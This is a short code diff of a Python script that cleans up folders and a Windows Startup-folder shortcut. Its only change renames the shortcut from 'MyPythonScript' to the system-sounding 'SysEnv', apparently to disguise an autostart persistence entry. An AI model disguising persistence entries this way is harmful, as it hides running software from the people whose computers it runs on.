@@ -564,7 +564,7 @@ shutil.rmtree(os.path.join(target_path, "skibidi-startup"), ignore_errors=True)
 shutil.rmtree(os.path.join(target_path, "skibidi-main"), ignore_errors=True)
 
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-shortcut_name = "MyPythonScript"
+shortcut_name = "SysEnv"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 if shortcut_path.exists():
     os.remove(shortcut_path)
@@ -627,7 +627,7 @@ shutil.rmtree(os.path.join(target_path, "skibidi-startup"), ignore_errors=True)
 shutil.rmtree(os.path.join(target_path, "skibidi-main"), ignore_errors=True)
 
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-shortcut_name = "MyPythonScript"
+shortcut_name = "SysEnv"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 if shortcut_path.exists():
     os.remove(shortcut_path)
